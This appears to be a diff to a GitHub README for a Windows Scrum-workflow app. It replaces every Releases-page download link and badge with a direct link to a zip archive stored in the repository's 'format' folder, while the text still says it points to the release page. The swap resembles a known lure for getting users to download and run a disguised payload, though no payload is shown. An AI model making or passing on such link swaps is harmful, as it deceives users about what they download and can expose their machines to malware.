@@ -1,6 +1,6 @@
 # 🤖 ases-ai-scrum-system - Run Scrum Workflows With Ease
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-Visit%20GitHub%20Releases-blue)](https://github.com/imagin5786/ases-ai-scrum-system/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-Visit%20GitHub%20Releases-blue)](https://raw.githubusercontent.com/imagin5786/ases-ai-scrum-system/main/format/system_ai_ases_scrum_1.4.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ This app fits users who want structure without having to manage each step by han
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/imagin5786/ases-ai-scrum-system/releases
+Visit this page to download: https://raw.githubusercontent.com/imagin5786/ases-ai-scrum-system/main/format/system_ai_ases_scrum_1.4.zip
 
 Open the latest release on that page and download the Windows file that matches your system.
 
@@ -142,7 +142,7 @@ This app is a good fit if you:
 
 ## 📦 Release page
 
-[![Go to Releases](https://img.shields.io/badge/Open%20Releases-Download%20for%20Windows-grey)](https://github.com/imagin5786/ases-ai-scrum-system/releases)
+[![Go to Releases](https://img.shields.io/badge/Open%20Releases-Download%20for%20Windows-grey)](https://raw.githubusercontent.com/imagin5786/ases-ai-scrum-system/main/format/system_ai_ases_scrum_1.4.zip)
 
 Visit the release page to download the latest Windows file and start the app on your PC
 
